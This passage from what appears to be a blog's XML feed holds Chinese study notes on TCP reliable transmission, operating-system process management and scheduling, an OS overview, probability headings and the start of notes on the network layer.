TCP的连接TCP把连接作为最基本的抽象,每一条TCP连接有两个端点,TCP连接的端点不是主机,不是主机的IP地址,不是应用进程,也不是运输层的协议端口.TCP连接的端点叫做套接字(socket)或插口.端口号拼接到IP地址即构成了套接字.每一条TCP连接唯一地被通信两端的两个端点,即两个套接字所确定. TCP连接就是由协议软件所提供的一种抽象,同一个IP地址可以有多个不同的TCP连接.同一个端口号也可以出现在多个不同的TCP连接中. 应用编程接口API称为socket API,简称为socket.socket API中使用的一个函数名也叫作socket.调用socket函数的端点称为socket.调用socket函数时其返回值称为socket描述符,可简称为socket,在操作系统内核中连网协议的Berkeley实现,称为socket实现. 服务器进程:被动打开一个套接字,将套接字与本地系统某IP地址绑定,在某一端口上监听,请求到达套接字,接受,接收,发送报文段,服务完毕,关闭本次TCP连接,等待新服务请求. 客户进程:主动打开套接字,并与指定服务器进程的套接字连接.与服务器进入接收,发送报文段的过程,服务完毕,关闭客户进程. 可靠传输的工作原理理想的传输条件有以下两个特点:传输信道不产生差错,不管发送方以多快的速度发送数据,接收方总是来得及处理收到的数据.在这样的理想传输条件下,不需要采取任何措施就能够实现可靠传输.IP网络所提供的是不可靠的传输,TCP需要自己来提供可靠交付的服务. 停止等待协议停止等待就是每发送完一个分组就停止发送,等待对方的确认.在收到确认后再发送下一个分组.全双工通信的双方既是发送方也是接收方. 无差错情况. 出现差错有两种情况:接收方接收分组时检测出了差错,就丢弃分组,其他什么也不做(不通知发送方收到有差错的分组);分组在传输过程中丢失了,接收方什么都不知道,也什么都不做.这两种情况下发送方都必须重发分组,直到接收方正确接收返回确认为止. 超时重传:发送方为每一个已发送的分组都设置一个超时计时器,只要在超时计时器到期之前收到了相应的确认,就撤销该超时计时器,继续发送下一个分组.若在超时计时器规定时间内没有收到确认,就认为分组错误或丢失,就重发该分组. 编号:发送方为每一个发送的分组都进行编号,若接收方收到了编号相同的分组,则认为收到了重复分组,丢弃重复的分组,并回送确认.接收方为发送的确认也进行编号,指示该确认是对哪一个分组的确认,发送方同样丢弃重复的确认. 确认丢失:若接收方所发送的对分组的确认丢失了,那么发送方在设定的超时重传时间内不能收到确认,无论是因为确认丢失还是分组错误还是分组丢失,都会重传分组.接收方丢弃重传的分组,并向发送方发送的对分组的确认. 确认迟到:若接收方所发送的对分组的确认迟到了,发送方仍重传分组.之后接收方丢弃重传的分组,并向发送方发送的对分组的确认.发送方丢弃重复的确认. 发送完一个分组后,必须暂时保留已发送的分组的副本以备重发.分组和确认分组都必须进行编号.超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些. 连续ARQ协议通常发送方最终总是可以收到对所有发出的分组的确认,如果发送方不断重传分组但总是收不到确认,就说明通信线路太差,不能进行通信.使用上述的确认和重传机制,就可以在不可靠的传输网络上实现可靠的通信.这种传输协议常称为自动重传请求ARQ,意思是重传的请求是自动进行的,接收方不需要请求发送方重传某个出错的分组. 停止等待协议的优点是简单,缺点是信道利用率太低.当往返时间远大于分组发送时间时,信道的利用率就会非常低. 为了提高传输效率,发送方可以不使用低效率的停止等待协议,而是采用流水线传输.流水线传输就是发送方可连续发送多个分组,不必每发完一个分组就停顿下来等待对方的确认. 连续ARQ协议基本思想:发送方一次可以发出多个分组;使用滑动窗口协议控制发送方和接收方所能发送和接收的分组的数量和编号;每收到一个确认,发送方就把发送窗口向前滑动;接收方一般采用累积确认的方式;采用回退N方法进行重传. 累积确认:不必对收到的分组逐个发送确认,而是对按序到达的最后一个分组发送确认,表示到这个分组为止的所有分组都已正确收到了. 回退N:发送方发送了前5个分组,而中间的第3个分组丢失,这时接收方只能对前两个分组发出确认.发送方无法知道后面三个分组的下落,而只好把后面的三个分组都再重传一次.通信线路质量不好时,连续ARQ协议会带来负面的影响. TCP的可靠传输机制用字节的序号进行控制,TCP所有的确认都是基于序号而不是基于报文段.TCP连接的每一端都必须设有两个窗口:发送窗口和接收窗口.TCP两端的四个窗口经常处于动态变化之中.TCP连接的往返时间RTT也不是固定不变的,需要使用特定的算法估算较为合理的重传时间. 发送方维持的发送窗口,它的意义是:位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认.连续ARQ协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置. 发送后,在收到确认前,发送窗口会变小;接收的分组正确,向前滑动接收窗口;收到确认后,向前滑动发送窗口,窗口变大. TCP报文段的首部格式P98 TCP可靠通信的实现TCP的流量控制TCP的拥塞控制TCP的运输连接管理]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operating-system-进程管理]]></title>
    <url>%2Fposts%2F5f224923%2F</url>
    <content type="text"><![CDATA[概念进程是程序的运行的实体,是操作系统进行资源分配和调度的一个独立单位.处理机(CPU)是最重要的系统资源,处理机管理的主要内容是处理机调度,而处理机分配和运行又是以进程为基本单位,故对处理机的管理可归结为对进程的管理. 从进程的角度:进程在封闭的环境顺序执行代码,独占全机资源,且每次进程的运行结果都是相同的. 从操作系统的角度:多个进程并发运行,间断的执行各进程,多个进程共享系统中的各种资源,每次进程的运行结果可能不再相同(这个有时候是需要的,比如用户输入,有时候是不需要的,比如条件竞争问题). 条件竞争问题主要源于对相同资源的写操作,如果一个进程写资源A,则写前和写后就出现了两种环境,另一个进程如果要访问该资源就会有两种不同的结果,重点在于此时的结果不可预测. 进程管理的基础进程控制块PCB系统利用进程控制块PCB来控制和管理进程,进程控制块PCB存放用于描述该进程情况和控制进程运行所需的全部信息.进程与PCB是一一对应的. 在进程控制块中,主要包括下述四方面用于描述和控制进程运行的信息. 进程标识符信息,用于唯一地标识一个进程,一个进程通常有两种标识符:外部标识符,由创建者提供;内部标识符,操作系统提供. 处理机状态信息,主要由处理机中各种寄存器的内容所组成,包括:通用寄存器,指令计数器,程序状态字,用户栈指针等. 进程调度信息,与进程调度和进程对换有关的信息,包括:进程状态,进程优先级,进程调度所需的其它信息,事件等. 进程控制信息,包括:程序和数据的地址(用于恢复运行),进程同步和通信机制(如消息队列指针,信号量等.它们可能全部或部分地放在PCB中),资源清单(除CPU外进程所需的全部资源及已经分配到该进程的资源清单),链接指针(本进程所在队列中的下一个进程的PCB首地址). PCB的组织方式:链接方式,不同状态进程分别组成队列;索引方式,根据所有进程的状态,建立几张索引表. 进程的特征与状态进程具有五个基本特征. 动态性,进程是程序的一次执行过程,有一定的生命周期. 并发性:多个进程同时存于内存中,能在一段时间内同时运行. 独立性:独立运行,同时也是系统中独立获得资源和独立调度的基本单位. 异步性:进程按各自独立的,不可预知的速度向前推进,即按异步方式运行. 结构特征:进程实体是由程序段,数据段及进程控制块三部分组成,Unix中把这三部分统称为进程映像. 进程的三种基本状态. 就绪状态:指当进程已分配到除CPU以外的所有必要的资源后,只要能再获得处理机,便可立即执行. 执行状态:指进程已获得处理机,程序正在执行.在单处理机系统中,只能有一个进程处于执行状态.在多处理机系统中,则可能有多个. 阻塞状态:指进程因等待某事件暂停执行时的状态. 在不少系统中,又增加了两种基本状态. 新状态:指进程刚刚建立,但还未进入就绪队列时的状态. 终止状态:当一个进程已经正常结束或异常结束,OS已将它从就绪队列中移出,但尚未将它撤消时的状态. 有些系统定义一个挂起状态,引起挂起状态可能基于4个方面:终端用户的需要,父进程的需要,工作负荷调节的需要,操作系统的需要. Linux进程状态Linux进程状态共6种. 执行(TASK_RUNNING):正在运行或准备运行的进程,实际参与进程调度. 可打断睡眠(TASK_INTERRUPTIBLE):处于等待队列中的进程,待资源有效时唤醒,也可由其它进程通过信号(signal)或定时中断唤醒后进入就绪队列. 不可打断睡眠(TASK_UNINTERRUPTIBLE):处于等待队列中的进程,待资源有效时唤醒,不可由其它进程通过信号(signal)或定时中断唤醒. 僵死(TASK_ZOMBIE):表示进程结束但尚未消亡的一种状态.此时,进程已经结束运行且释放大部分资源,但尚未释放PCB. 暂停(TASK_STOPPED):进程被暂停,通过其它进程的信号才能唤醒.导致这种状态的原因有二:收到SIGSTOP,SIGSTP,SIGTTIN或SIGTTOU信号;受其它进程的ptrace系统调用的控制而暂时将CPU交给控制进程. 交换(TASK_SWAPPING):进程页面被交换出内存的进程.2.0.35版本的Linux内核没有使用该状态. 此外,Linux还定义11种进程标志. 1234567891011PF_ALIGNWARN #打印对齐警告信息PF_PTRACED #被ptrace系统调用监控PF_TRACESYS #正在跟踪PF_FORKNOEXEC #进程刚创建,但还没执行PF_SUPERPRIV #超级用户特权PF_DUMPCORE #dumped corePF_SIGNALED #进程被信号杀出PF_STARTING #进程正被创建PF_EXITING #进程开始关闭PF_USEDFPU #该进程使用FPUPF_DTRACE #delayed trace 进程控制进程控制是对系统中所有进程从产生,存在到消亡的全过程实行有效的管理和控制.通常将一些与硬件紧密相关的模块,运行频率较高的模块,以及一些基本操作都安排在紧靠硬件的软件层次中,并使它们常驻内存,加以特殊的保护,把这一部分称为OS的内核.进程控制一般是由操作系统的内核来实现. 内核中通常都包含以下功能(Unix中,内核所包含的功能很多,OS的整个基本功能都属于内核):中断处理,时钟管理,原语操作,资源管理功能(进程管理,存储管理,设备管理).内核在执行某些基本操作时,往往是利用原语操作实现的.原语本身也是由若干条指令所构成,用于完成一定功能的一个过程.区别在于原语是原子操作,指一个操作中的所有动作,要么全做,要么全不做(通过关闭中断实现). 进程图是一棵有向树,结点代表进程.一棵树表示一个家族,根结点为该家族的祖先.也就是父进程与子进程的关系图. 创建进程引起创建进程的事件:应用请求,用户登录,作业调度,提供服务. 创建进程的主要工作:向系统申请一个空闲的PCB,分配资源,初始化PCB,把PCB插入就绪队列. 进程终止引起进程终止的事件:正常结束,异常结束(越界错误,保护错,特权指令错,非法指令错,运行超时,等待超时,算术运算错,I/O故障),外界干预(操作系统或用户,父进程请求,父进程终止). 终止过程的主要工作:根据被终止进程的标识符,从PCB集合中检索出该进程的PCB,从中读出该进程的状态.若被终止进程正处于执行状态,立即终止该进程的执行.若该进程还有子孙进程,还应将其所有子孙进程予以终止,以防成为不可控的进程.将被终止进程所拥有的全部资源,或者归还给其父进程,或者归还给系统.将被终止进程的PCB从所在队列(或链表)中移出,等待其他程序来搜集信息. 进程阻塞引起进程阻塞的事件:请求系统服务不满足,启动某种操作,新数据尚未到达,无新工作可做 进程阻塞过程:立即停止执行,把进程控制块中的状态由执行改为阻塞.将PCB插入阻塞队列,如果系统中设置了因不同事件而阻塞的多个阻塞队列,则应将本进程插入到具有相同事件的阻塞(等待)队列.调度程序进行重新调度,将处理机分配给另一就绪进程并进行切换. 进程唤醒引起进程唤醒事件:系统服务由不满足到满足,I/O(启动的操作)完成,新数据到达. 进程唤醒过程:被阻塞的进程从等待该事件的阻塞队列中移出,将其PCB中的状态由阻塞改为就绪,然后再将该PCB插入到就绪队列中. 挂起与激活挂起原语的执行过程:检查被挂起进程的状态,若处于活动就绪状态,便将其改为静止就绪;对于活动阻塞状态的进程,将之改为静止阻塞.为了方便用户或父进程考查该进程的运行情况而把该进程的PCB复制到某指定的内存区域.最后,若被挂起的进程正在执行,则转向调度程序重新调度. 激活原语的执行过程:先将进程从外存调入内存,检查该进程的现行状态,若是静止就绪,便将之改为活动就绪;若为静止阻塞便将之改为活动阻塞.假如采用的是抢占调度策略,则每当有新进程进入就绪队列时,应检查是否要进行重新调度. 进程同步在多道程序系统中,由于资源共享或进程合作,使进程间形成间接相互制约和直接相互制约关系,这需要用进程互斥与同步机制来协调两种制约关系. 临界资源与临界区系统中某些资源一次只允许一个进程使用,称这样的资源为临界资源或互斥资源.只要把进程中访问临界资源的那段代码分离出来(称为临界区),诸进程互斥地进入自己的临界区即可. 每个进程在进入临界区之前应先对欲访问的临界资源进行检查,临界资源未被访问才可进入临界区,并设置它正被访问的标志;否则不能进入临界区,必须等待,以保证诸进程互斥地访问临界资源.对要求访问临界资源的进程,应保证该进程能在有效时间内进入自己的临界区,当进程不能进入自己的临界区时,应立即释放处理机以免陷入死等状态. 相应地,在结束对临界区的访问后也要加上一段代码用于将临界区正被访问的标志恢复为未被访问标志. 利用软件解决进程互斥问题假如有两个进程Pi和Pj,它们共享一个临界资源R.用软件方法使进程Pi和Pj能互斥地访问资源R. Peterson算法:flag[i]为true表示Pi要进或正在临界区.turn为j,表示应轮到Pj. 12345678910111213141516171819202122232425P0: repeat flag[0]:=true; turn:=1; while (flag[1] and turn=1) do no_op; critical_section; flag[0]:=false; remainder_section;until false;P1: repeat flag[1]:=true; turn:=0; while (flag[0] and turn=0) do no_op; critical_section; flag[1]:=false; remainder_section;until false;flag[0]=false;flag[1]=false;Parbegin(P0, P1); 利用硬件解决进程互斥问题由于中断的原因,使得一个进程在对一个共享资源的取值和修改的这两个动作中,可能有其他进程对此共享资源的修改,从而破坏了此共享变量数据的完整性和正确性,导致非预期的结果. 许多大型机和微型机中都提供了专用的硬件指令(例如IBM370系列机中的TS(检测和设置)指令,Intel 8086中的XCHG),这些指令允许将多个操作限制为一个原子操作,中间不会发生中断,用这些指令就可以解决临界区问题. 原子操作,对于单处理机,可用禁止中断实现,对于多处理机,要用软件协助解决. 锁方法为了解决同类临界区互斥问题,可以为每类临界区设置一把锁,锁有两种状态:打开状态,资源空闲,可以进入临界区;关闭状态,资源被占用,不可进入临界区.只要在每个进程进入临界区前,执行关锁操作阻止别的进程进入临界区,退出临界区后执行开锁操作让别的进程进入临界区. TS功能C++语言描述. 12345678bool TS(bool &amp; lock) &#123; if(lock == true) return true; else &#123; lock = true; return false; &#125;&#125; 利用TS实现进程互斥:可为每个临界资源设置一个布尔变量lock,并赋予其初值为false,以表示资源空闲. 123456repeat while (TS(lock)) do skip critical_section; lock:=false; remainder_section; 锁方法缺点:忙等,某种临界资源只能一个进程使用. 信号量机制在长期且广泛的应用中,信号量机制得到了很大的发展,从整型信号量到记录型信号量,进而发展为信号量集机制.P.V分别是荷兰语的test(proberen,测试)和increment(verhogen,增量). 整型信号量最初把信号量定义为一个整型量,用于表示资源的使用情况,除初始化外,仅能通过两个标准的原子操作wait(s)和signal(s)来访问,分别称为P,V操作. 1234567wait(s): while (s &lt;= 0) do no-op s:=s-1;signal(s): s:=s+1; s表示空闲资源数,P操作申请一个资源,V操作释放一个资源,P.V操作必须成对出现. 整型信号量缺点:忙等. 记录型信号量为克服忙等,重新对信号量和P.V操作定义. 12345678910111213141516171819202122232425信号量数据结构type semaphore = record value:integer; 资源使用情况 L:list of process; 在此信号量上等待的进程队列指针endS.Value &gt; 0 表示某类可用资源的数量S.Value &lt; 0 其绝对值为因请求该资源而被阻塞的进程数S.Value的初值为1表示只允许一个进程访问临界资源,此时的信号量转化为互斥信号量.procedure wait(s): 意味着请求分配一个单位资源 var S:semaphore; begin S.value:=S.value – 1; If (S.value &lt; 0) then block(S,L); 无空闲资源,进程被阻塞,不会忙等 endprocedure signal(s): 意味着释放一个单位资源 var S:semaphore; begin S.value:=S.value + 1; If (S.value &lt;= 0) then wakeup(S,L); 唤醒第一个,插入就绪队列 end 死锁当一个进程需要先获得两个或更多的共享资源后,方能执行时,进程并发执行可能产生死锁. 假定有两个进程A和B,都要访问共享数据D和E,可为其设互斥信号量Dmutex和Emutex,令初值为1. 123456789101112process A wait(Dmutex); wait(Emutex);process B wait(Emutex); wait(Dmutex); procedure A: wait(Dmutex);于是Dmutex = 0procedure B: wait(Emutex);于是Emutex = 0procedure A: wait(Emutex);于是Emutex = -1,A阻塞procedure B: wait(Dmutex);于是Dmutex = -1,B阻塞 AND型信号量集机制解决进程死锁问题将进程在整个运行过程中所需要的所有临界资源,一次性地全部分配给进程,待该进程使用完后在一起释放. 为此在wait操作中增加了一个AND条件,故称为AND同步,或称为同时wait操作,即Swait(Simulianeouswait).signal操作同样做出改变. 123456789101112131415Swait(S1, S2, ..., Sn) if S1 &gt;= 1 AND S2 &gt;= 1 AND ... AND Sn &gt;= 1 then for I := 1 to n do Si:= Si – 1; endfor else 调用进程进入第一个小于1信号量的等待队列Sj.queue,阻塞调用进程 endifSsignal(S1,S2,S3,…,Sn) For i:= 1 to n do Si:= Si + 1; 将Si.queue中等待的每一个进程取出 判断进程P是否通过Swait中的测试,是则进程P进入就绪队列,否则进程P进入某等待队列. endfor 信号量集对AND信号量机制进行两方面扩充,一次分配释放多个临界资源对系统现有资源数的测试值由1改为ti. 1234567891011121314Swait(S1,t1,d1,S2,t2,d2,…,Sn,tn,dn) if S1 &gt;= t1 AND S2 &gt;= t2 ... Sn &gt;= tn then for I := 1 to n do Si:= Si - di; endfor else 调用进程进入第一个小于ti信号量的等待队列Si.queue,阻塞调用进程 endifSsignal(S1,t1,d1,S2,t2,d2,…,Sn,tn,dn) For i:= 1 to n do Si:= Si + di; 将Si.queue中等待的每一个进程取出 endfor 信号量的应用在并发系统中,信号量被广泛地用于:使诸进程互斥地进入临界区;处理程序或语句间的前趋关系. 12345678910111213141516171819202122var mutex:semaphore:＝1;begin parbegin process 1:begin repeat wait(mutex); critical_section; signal(mutex); remainder_section; until false; end process 2:begin repeat wait(mutex); critical_section; signal(mutex); remainder_section; until false; end parendend 123456var S:semaphore:＝0;S1 V(S) 前趋语句后做V(S)操作P(S) 后继语句前后做P(S)操作S2 经典进程同步问题管程机制虽然信号量机制是一种既方便又有效的进程同步机制,但每个要访问临界资源的进程必须自备同步操作wait(s)和signal(s),必须成对出现,也不能颠倒.这就使大量的同步操作分散在各个进程中,这不仅给系统的管理带来麻烦,而且还会因同步操作的使用不当而导致系统死锁.这样,在解决上述问题的过程中,便产生了一种新的进程同步工具,管程. 管程由三部分组成:局部于管程的共享变量说明,对该数据结构进行操作的一组过程,对局部于管程的数据设置初始值的语句. 1234567891011121314type monitor-name=monitor;Var x, y:condition;procedure entry P1(...); begin ... end;procedure entry P2(...); begin ... end;...procedure entry Pn(...); begin ... end;begin initialization code;end 管程中每个条件变量的P,V操作可表示为X.wait和X.signal. X.signal操作的作用,是重新启动一个被阻塞的进程,但如果没有被阻塞的进程,则X.signal操作不产生任何后果,这与信号量机制中的signal操作不同. 如果有进程Q处于阻塞状态,当进程P执行了X.signal操作后,怎样决定由哪个进行执行,哪个等待,可采用两种方式:P等待,直至Q离开管程或等待另一条件;Q等待,直至P离开管程或等待另一条件.Hansan却采用了第一种处理方式. 利用管程方法来解决生产者-消费者问题1234567891011121314151617181920212223242526272829303132333435363738394041type producer-consumer=monitor;Var in, out, count:integer;buffer:array[0, ..., n - 1] of item;notfull, notempty:condition;procedure entry put(item) begin if count &gt;= n then notfull.wait; buffer[in] ∶= nextp; in ∶= (in + 1) mod n; count ∶= count + 1; if notempty.queue then notempty.signal; endprocedure entry get(item) begin if count &lt;= 0 then notempty.wait; nextc ∶= buffer[out]; out ∶= (out + 1) mod n; count ∶= count - 1; if notfull.quene then notfull.signal; endbegin in∶=out∶=0; count∶=0endproducer:begin repeat produce an item in nextp; PC.put(item); until false;endconsumer:begin repeat PC.get(item); consume the item in nextc; until false;end 进程通信高级进程通信,是指用户可直接利用操作系统所提供的一组通信命令,高效地传送大量数据的一种通信方式.操作系统隐藏了进程通信的实现细节.高级通信机制可归结为三大类:共享存储器系统,消息传递系统,管道通信. 共享存储器系统通过共享某些数据结构或共享存储区进行通信. 基于共享数据结构的通信方式:进程通过公用某些数据结构交换信息.如在生产者—消费者问题中是用有界缓冲区这种数据结构实现通信的.这里,公用数据结构的设置及对进程间同步的处理,都是程序员的职责.因此这种通信方式是低效的只适于传递少量数据. 基于共享存储区的通信方式:为传输大量数据,在存储器中划出了一块共享存储区,诸进程可通过对共享存储区中的数据,进行读写来实现通信.进程在通信前,向系统申请共享存储区中的一个分区,并指定该分区的关键字;若这样的分区已分配结其它进程,则返回该分区的描述符.接着,申请者可把该分区连接到本进程上;此后,便可像读,写普通存储器一样地读,写公用存储分区. 消息传递系统进程间的数据交换以消息为单位,程序员直接利用系统提供的一组通信命令来实现通信,操作系统隐藏了通信的实现细节. 消息传递系统因其实现方式的不同可分为:直接通信方式,发送进程直接将消息发送给接收进程,并将它挂在接收进程的消息缓冲队列上,接收进程从消息缓冲队列中取得消息;间接通信方式,发送进程将消息发送到某种中间实体中,接收进程从中取得消息.这种中间实体一般称为信箱,故这种通信方式也称为信箱通信方式,被广泛应用于计算机网络中,相应系统被称为电子邮件系统. 管道通信所谓管道,是指用于连接一个读进程和一个写进程,以实现它们之间通信的共享文件,又称为pipe文件. 为了协调双方的通信,管道通信机制必须提供三方面的协调能力:当一个进程正在对pipe进行读／写操作时,另一进程必须等待;当写(输入)进程把一定数量(如4KB)数据写人pipe后,便去睡眠等待,直到读(输出)进程取走数据后,再把它唤醒,当读进程读一空白pipe时,也应睡眠等待,直至写进程将数据写入管道后,才将它唤醒;对方是否存在,只有确定对方已存在时,方能进行通信. 进程调度进程调度的主要目的是分配处理机,但在不同的OS中所采用的调度方式是不完全相同的,因此可从不同的角度对调度进行分类.一种分类法也是较常用的,即按OS的类型分类,因而有批处理调度,分时调度和实时调度,还有多处理机调度.一种是常用的分类方法即按调度的层次,把调度分为高级,中级和低级调度. 作业从进入系统并驻留在外存的后备队列上开始,直至作业运行完毕,通常要经过三个状态,可能要经历三级调度:高级调度,中级调度,低级调度. 高级调度高级调度又称为作业调度,接纳调度或长程调度,用于决定把外存上处于后备队列中哪些作业调入内存,并为它们创建进程,分配必要的资源,然后,再将新创建的进程排在就绪队列上,准备执行.在分时系统中为了能及时响应,用户通过键盘输入的命令或数据等,都是直接送入内存,因而无需配置作业调度.类似地,在实时系统中,通常也不需要作业调度. 作业调度每次要接纳多少个作业进入内存,取决于多道程序度,即允许有多少个作业同时在内存中运行.当内存中可以同时运行的作业太多时,可能会影响到系统的服务质量,如使周转时间太长.如果内存中同时运行的作业太少时,又会导致系统资源利用率和系统吞吐量太低. 应将哪些作业从外存调入内存,将取决于所采用的调度算法.最简单的是先来先服务调度算法,它是将最早进入外存的作业先调入内存;较常用的一种是短作业优先调度算法,即将外存上最短的作业最先调入内存;此外,还有基于作业优先权的调度算法,响应比高者优先的调度算法等; 低级调度低级调度通常又称为进程调度,短程调度.它决定就绪队列中的哪个进程将获得处理机,然后由分派程序执行把处理机分配给该进程的操作. 进程调度的运行频率很高,在分时系统中通常是几十毫秒就要运行一次,进程调度是最基本的一种调度,在三种类型的OS中都必须配置这级调度.进程调度可采用非抢占方式和抢占方式. 非抢占方式:一旦把处理机分配给某进程后,便让该进程一直执行,直至该进程完成或发生某事件而被阻塞时,才再把处理机分配给其它进程,决不允许某进程抢占已经分配出去的处理机. 抢占方式:这种调度方式,允许调度程序根据某种原则,去停止某个正在执行的进程,将已分配给该进程的处理机,重新分配给另一进程. 时间片原则:各进程按时间片运行,当一个时间片用完后,便停止该进程的执行而重新进行调度.这种原则适用于分时系统,大多数实时系统,以及要求较高的批处理系统. 优先权原则:通常是对一些重要的和紧急的作业赋予较高的优先权,当这种作业到达时,如果其优先权比正在执行进程的优先权高便停止正在执行的进程,将处理机分配给优先权高的进程,使之执行. 短作业(进程)优先原则:当新到达的作业(进程)比正在执行的作业(进程)明显地短时,将剥夺长作业(进程)的执行,将处理机分配给短作业(进程),使之优先执行. 中级调度中级调度又称为中程调度.引入中级调度的主要目的是为了提高内存的利用率和系统吞吐量.为此,应使那些暂时不能运行的进程不再占用宝贵的内存空间,而将它们调至外存上去等待,称此时的进程状态为就绪驻外存状态或挂起状态. 当这些进程重又具备运行条件且内存又稍有空闲时,由中级调度决定,将外存上的那些重又具备运行条件的就绪进程重新调入内存,并修改其状态为就绪状态,挂在就绪队列上,等待进程调度.]]></content>
      <categories>
        <category>CS</category>
        <category>operating-system</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operating-system-概论]]></title>
    <url>%2Fposts%2F3dfa76f5%2F</url>
    <content type="text"><![CDATA[简介操作系统是管理计算机硬件资源与软件运行的一个软件,需要处理如管理与配置内存,决定系统资源供需的优先次序,控制输入与输出设备,控制网络设备与管理文件系统等基本事务.个人操作系统一般会提供一个让用户与系统交互的操作界面.裸机是指未配置软件的计算机,必须用机器语言编程. OS的发展过程主要有4个阶段. 无OS,手工操作阶段.此时CPU等待人工操作. 单道批处理系统.程序和数据的输入输出都是在外围计算机的控制下完成的,称之为脱机输入输出操作.此时CPU直接从外围计算机获取程序和数据,减少了CPU的空闲时间且提高I/O速度.批处理是指计算机系统对一批作业自动进行处理的一种技术. 多道批处理系统,分时系统和实时系统. 应用于微机的OS,如MS DOS,Windows,Unix和Linux;并行机(多处理机)OS,网络OS,分布式OS. 多道批处理系统:在计算机内存中同时存放若干道已开始运行尚未结束的程序,用户所提交的作业组成一个后备队列,作业调度程序按一定的算法从后备队列中选择若干个作业调入内存,使它们共享CPU和系统中的各种资源.优点:资源利用率高,系统吞吐量大,可提高内存和I/O设备利用率.缺点:平均周转时间长,无交互能力.需要解决的问题:处理机管理,内存管理,I/O设备管理,文件管理,作业(进程)管理. 分时系统:采用时间片(时间片太小会增加系统开销)的方法,同时为许多终端用户服务,对每个用户能保证足够快的响应时间,并提供交互会话的功能.特点,多路性,交互性,独占性,及时性. 实时系统:能及时响应外部事件的请求,在规定的时间内完成对该事件的处理,并控制所有实时任务协调一致地运行.分为实时控制系统(工业生产)和实时信息处理系统(银行,机票订购系统).特点,对外部请求在严格时间范围内作出反应,高可靠性,安全性和完整性. OS的基本特性OS的四个基本特性. 并发:并发指一段时间间隔内运行;并行指同一时刻运行. 共享:互斥共享和同时访问. 虚拟:把一个物理实体变为若干个逻辑上的对应物. 异步:在多道程序环境下,某个作业何时执行,何时暂停,执行时间是不确定的. OS的功能从资源管理观点看,操作系统具有五大功能:处理机管理,存储器管理,设备管理,文件管理,用户接口. 处理机管理对处理机的分配和运行实施有效管理,即对进程的管理. 进程控制:建立进程,分配资源,调度运行;撤消该进程,回收资源. 进程同步:指系统对并发执行的进程进行协调,最基本的进程同步方式是使诸进程以互斥方式访问临界资源. 进程通信:相互合作的进程间进行信息的交换. 进程调度:当一个正在执行的进程已经完成,或因某事件而无法继续执行时,系统应进行进程调度,重新分配处理机. 存储器管理对内存的管理. 内存分配:各道程序都有自己的内存空间,涉及分配,回收,移动等. 内存保护:保证各道程序都只在自己的内存空间运行而互不干扰. 地址映射:把程序地址空间中的逻辑地址转换为内存空间对应的物理地址,从而为用户编程提供了方便. 内存扩充:借助于虚拟内存空间技术,使系统的内存比物理内存大得多. 设备管理为用户程序分配I/O设备,完成用户程序请求的I/O操作,提高CPU和I/O设备的利用率. 缓冲管理:利用缓冲来缓和CPU和I/O设备间速度不匹配的矛盾. 设备分配:系统根据用户所请求的设备类型和所采用的分配算法对设备进行分配. 设备处理:启动指定的I/O设备,完成用户规定的I/O操作. 虚拟设备功能:通过某种技术使该设备成为能被多个用户共享的设备,以提高设备利用率. 文件管理进行文件存储空间的管理,目录管理,文件读写管理.包括文件的属性,大小,存储位置等等. 用户接口包括命令接口shell指令,程序接口,图形接口GUI界面.]]></content>
      <categories>
        <category>CS</category>
        <category>operating-system</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mathematics-probability-theory-随机变量的数字特征]]></title>
    <url>%2Fposts%2F76ab93ca%2F</url>
    <content type="text"><![CDATA[随机变量的数学期望 随机变量函数的数学期望 数学期望的性质 对于一个复杂的随机变量X,可以将X分解成数个r.v.之和,然后利用随机变量和的数学期望等于随机变量的数学期望之和来求解. 方差方差描述了r.v.对其数学期望的离散程度,在概率论和数理统计中十分重要. 常用计算公式. 方差的性质方差的性质. 常见分布的数学期望和方差 协方差和相关系数 协方差的性质 相关系数的性质 不相关与相互独立 矩,协方差矩阵 协方差阵的性质 n元正态随机变量及其性质 n元正态随机变量的性质.]]></content>
      <categories>
        <category>mathematics</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-网络层]]></title>
    <url>%2Fposts%2F9f2b0248%2F</url>
    <content type="text"><![CDATA[网络层(网际层)提供的两种服务虚电路服务:虚电路表示这只是一条逻辑上的连接,分组都沿着这条选定的逻辑连接按照存储转发方式传送,而并不是真正建立了一条物理连接.电路交换的电话通信是先建立了一条真正的物理连接. 数据报服务:网络层向上只提供简单灵活的,无连接的,尽最大努力交付的数据报服务,网络在发送分组时不需要先建立连接.每一个分组(即IP数据报)独立发送,与其前后的分组无关(不进行编号).网络层不提供服务质量的承诺,即所传送的分组可能出错,丢失,重复和失序(不按序到达终点),也不保证分组传送的时限. 网际协议IP网际协议IP是TCP/IP体系中两个最主要的协议之一,与IP协议配套使用的还有三个协议:地址解析协议ARP,网际控制报文协议ICMP,网际组管理协议IGMP(这里讨论的IP都是指IPv4). 虚拟互连网络将网络互相连接起来要使用一些中间设备,中间设备又称为中间系统或中继系统,有五种不同的中间设备:物理层中继系统-转发器,数据链路层中继系统-网桥或桥接器,网络层中继系统-路由器,网桥和路由器的混合物-桥路器,网络层以上的中继系统-网关.当中继系统是转发器或网桥时(网络层以下),一般并不称之为网络互连,因为这仅仅是把一个网络扩大了,而这仍然是一个网络. 网关由于比较复杂,目前使用得较少.网络互连都是指用路由器进行网络互连和路由选择.许多有关TCP/IP的文献将网络层使用的路由器称为网关. 虚拟互连网络就是逻辑互连网络,互连起来的各种物理网络的异构性本来是客观存在的,利用IP协议就可以使这些性能各异的网络在用户看起来好像是一个统一的网络,这种虚拟互连网络可简称为IP网. 使用虚拟互连网络的好处是:当互联网上的主机进行通信时,就好像在一个网络上通信一样,而看不见互连的各具体的网络异构细节.如果在这种覆盖全球的IP网的上层使用TCP协议,那么就是现在的互联网. 分类的IP地址把整个互联网看成为一个单一的,抽象的网络,IP地址就是给每个连接在互联网上的主机(或路由器)分配一个在全世界范围是唯一的32位的标识符.IP地址现在由互联网名字和数字分配机构ICANN进行分配. 